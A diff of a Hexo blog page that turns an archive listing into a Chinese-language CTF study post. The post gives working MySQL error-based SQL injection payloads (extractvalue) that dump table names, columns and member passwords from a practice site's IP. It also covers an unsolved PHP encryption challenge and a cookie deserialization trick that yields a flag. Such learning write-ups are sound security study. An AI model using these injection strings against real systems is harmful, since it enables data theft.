@@ -6,18 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives: 2019/8 | Hexo</title>
+  <title>thirdth-day | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="a new ctfer&apos;s study">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://yoursite.com/archives/2019/08/index.html">
+  <meta name="description" content="&amp;emsp;&amp;emsp;关于报错注入的一些小总结:MySQL 5.1.5版本中添加了对XML文档进行查询和修改的两个函数：extractvalue、updatexml.ExtractValue() 使用XPath表示法从XML字符串中提取值UpdateXML()     返回替换的XML片段举例其用法:emsp;&amp;emsp;先从爆库开始:http://219.153.49.228:49919/ne">
+<meta property="og:type" content="article">
+<meta property="og:title" content="thirdth-day">
+<meta property="og:url" content="http://yoursite.com/2019/08/12/thirdth-day/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="a new ctfer&apos;s study">
+<meta property="og:description" content="&amp;emsp;&amp;emsp;关于报错注入的一些小总结:MySQL 5.1.5版本中添加了对XML文档进行查询和修改的两个函数：extractvalue、updatexml.ExtractValue() 使用XPath表示法从XML字符串中提取值UpdateXML()     返回替换的XML片段举例其用法:emsp;&amp;emsp;先从爆库开始:http://219.153.49.228:49919/ne">
 <meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-08-12T02:42:09.027Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hexo">
-<meta name="twitter:description" content="a new ctfer&apos;s study">
+<meta name="twitter:title" content="thirdth-day">
+<meta name="twitter:description" content="&amp;emsp;&amp;emsp;关于报错注入的一些小总结:MySQL 5.1.5版本中添加了对XML文档进行查询和修改的两个函数：extractvalue、updatexml.ExtractValue() 使用XPath表示法从XML字符串中提取值UpdateXML()     返回替换的XML片段举例其用法:emsp;&amp;emsp;先从爆库开始:http://219.153.49.228:49919/ne">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -153,295 +154,178 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-thirdth-day" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      thirdth-day
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/08/12/thirdth-day/" class="archive-article-date">
+
+        
+        <a href="/2019/08/12/thirdth-day/" class="archive-article-date">
   	<time datetime="2019-08-12T00:44:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-12</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/08/12/thirdth-day/">thirdth-day</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>&emsp;&emsp;关于报错注入的一些小总结:MySQL 5.1.5版本中添加了对XML文档进行查询和修改的两个函数：extractvalue、updatexml.ExtractValue() 使用XPath表示法从XML字符串中提取值<br>UpdateXML()     返回替换的XML片段<br>举例其用法:<br>emsp;&emsp;先从爆库开始:<br><a href="http://219.153.49.228:49919/new\_list.php?id=1&#39;" target="_blank" rel="noopener">http://219.153.49.228:49919/new\_list.php?id=1&#39;</a> and extractvalue(1,concat(0x7e,(database()),0x7e))--+<br>emsp;&emsp;然后开始爆表:<br><a href="http://219.153.49.228:49919/new\_list.php?id=1&#39;" target="_blank" rel="noopener">http://219.153.49.228:49919/new\_list.php?id=1&#39;</a> and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1 ),0x7e))--+<br>&emsp;&emsp;然后开始爆表里的字段：<br><a href="http://219.153.49.228:49919/new\_list.php?id=1%27%20and%20extractvalue" target="_blank" rel="noopener">http://219.153.49.228:49919/new\_list.php?id=1%27%20and%20extractvalue</a>(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=’member’ ),0x7e))–+<br>emsp;&emsp;最后爆表里的数据:<br><a href="http://219.153.49.228:49919/new\_list.php?id=1%27%20and%20extractvalue" target="_blank" rel="noopener">http://219.153.49.228:49919/new\_list.php?id=1%27%20and%20extractvalue</a>(1,concat(0x7e,(select group_concat(password) from member ),0x7e))–+<br>emsp;&emsp;基本上就是and extractvalue(1,concat(0x7e,(查询语句),0x7e))最后可以用–+，也就是注释加符号的用法隔开最后的引号。<br>37.PHP_encrypt_1(ISCCCTF)<br>&emsp;&emsp;这道题没有链接，进去只有一个fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=<br>和一个文件，先将这个base64解密看一下。解码以后是乱码，先不管这个打开提示文件看一下。解压后是一个php文件，本地运行看一下。这儿由于它叫index.php因而直接打开了打开后是空白的,直接看代码如下所示:<br><?php
+function encrypt($data,$key)
+{
+    $key = md5('ISCC');
+    $x = 0;
+    $len = strlen($data);
+    $klen = strlen($key);
+    for ($i=0; $i < $len; $i++) { 
+        if ($x == $klen)
+        {
+            $x = 0;
+        }
+        $char .= $key[$x];
+        $x+=1;
+    }
+    for ($i=0; $i < $len; $i++) {
+        $str .= chr((ord($data[$i]) + ord($char[$i])) % 128);
+    }
+    return base64\_encode($str);
+}
+?><br>上诉ord是返回字符串首字母的ascii值，然后strlen是返回字符串的长度。整个函数是一个加密函数，首先key的值是ISCC的md5加密，<br>md5(ISCC,32) = 729623334f0aa2784a1599fd374c120d<br>md5(ISCC,16) = 4f0aa2784a1599fd<br>这里有两种长度,但php的md5运行后是32位的因而舍弃16位情况。那么klen=32,data可能就是给出的那个数据是52位。现在直接将数字带入进去运行php试试。在一顿操作猛如虎后发现并没有效，在查看他人大量博文后发现自己理解错了题目意思，这道题是让自己写出解密函数按照加密函数的逆解出给出长串密文的对应明文即为key，由于个人能力不足此题暂放，后面来补。<br>38.flag.php(<a href="http://123.206.87.240:8002/flagphp/" title="flag.php" target="_blank" rel="noopener">http://123.206.87.240:8002/flagphp/</a>)<br>&emsp;&emsp;进入页面后发现是一个登陆框，但是任意输入数字点了登陆没反应，我想抓包试试。我发现这个Login可能本来就是个假的提交框，按了之后没有任何反应BP也接受不到提交包。题目最开始提示了一个hint，这个Hint就是暗示的意思但是去哪里找hint以及它是用来做什么的呢。<br>input value=”Login” type=”button”源代码中可以看到这就是个按钮框没有提交作用。再看哈有没有其他线索。一切都只给了一个hint,这种登陆框一般是sql注入，hint难道是用来传参的像id一样？试试/?hint=1,居然给出了大片的源代码。好了应该是代码审计了。<br>error_reporting(0);<br>include_once(“flag.php”);<br>$cookie = $_COOKIE[‘ISecer’];<br>if(isset($_GET[‘hint’])){<br>    show_source(_<em>FILE_</em>);<br>}<br>elseif (unserialize($cookie) === “$KEY”)<br>{<br>    echo “$flag”;<br>}<br><?php
+}
+$KEY='ISecer:www.isecer.com';
+?><br>也就是如果cookie的反序列化=key就输出flag.之前有做过反序列化的题，先去温习一哈。由于下面是一个单独的PHP因而上面的$key=””,因而先求的””的序列化为s:0:””;由于;再cookie中是不会正确上传到服务器的因而可以使用其Url编码%3B或者不写;进入BP后添加Cookie: ISecer=<br>s:0:””发包即可获得flag.<br>&emsp;&emsp;summary: 这道题主要要理清序列化和反序列化的关系，将一个序列化的东西再反序列化得到的就是序列化之前的东西，理解了这一点这道理就迎刃而解了。</p>
 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/08/12/thirdth-day/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/08/11/twelfth-day/" class="archive-article-date">
-  	<time datetime="2019-08-11T00:32:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-11</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2019/08/11/twelfth-day/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">twelfth-day</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/08/11/twelfth-day/">twelfth-day</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/08/10/eleventh-day/" class="archive-article-date">
-  	<time datetime="2019-08-10T01:48:23.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-10</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/08/10/eleventh-day/">eleventh-day</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/08/09/tenth-day/" class="archive-article-date">
-  	<time datetime="2019-08-09T01:12:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-09</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/08/09/tenth-day/">tenth day</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/08/08/ninth-day/" class="archive-article-date">
-  	<time datetime="2019-08-08T01:06:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-08</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/08/08/ninth-day/">ninth-day</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/08/07/eighth-day/" class="archive-article-date">
-  	<time datetime="2019-08-07T00:33:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-07</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/08/07/eighth-day/">eighth-day</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/08/05/seventh-day/" class="archive-article-date">
-  	<time datetime="2019-08-05T02:01:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-05</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/08/05/seventh-day/">seventh-day</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/08/04/sixth-day/" class="archive-article-date">
-  	<time datetime="2019-08-04T01:00:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-04</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/08/04/sixth-day/">sixth-day</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/08/03/fifth-day/" class="archive-article-date">
-  	<time datetime="2019-08-03T01:35:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-03</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/08/03/fifth-day/">fifth-day</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/08/02/fourth-day/" class="archive-article-date">
-  	<time datetime="2019-08-02T00:22:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-02</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/08/02/fourth-day/">fourth day</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/2019/08/page/2/">2</a><a class="extend next" rel="next" href="/archives/2019/08/page/2/">Next &raquo;</a>
-    </nav>
   
 
 
@@ -465,8 +349,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
